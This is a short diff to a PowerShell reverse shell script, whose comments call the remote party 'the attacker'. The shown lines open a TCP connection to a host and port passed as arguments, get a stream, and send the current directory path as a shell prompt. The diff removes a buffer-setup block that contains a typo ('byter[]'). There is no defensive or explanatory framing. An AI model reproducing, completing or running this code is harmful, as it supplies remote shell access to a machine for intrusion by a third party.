@@ -5,10 +5,7 @@
 $c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
 # Create a client stream to read and write to the connection
 $I = $c.GetStream();
-# Creating a buffer for the incoming commands from the attacker
-[byter[]]$U = 0..(2-shl15) | %{0};
-# Writing output to client stream 
-$I.Write($U,0,$U.Length)
+
 # Get location of Path Directory and encode in ASCII
 $U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
 $I.Write($U,0,$U.Length)
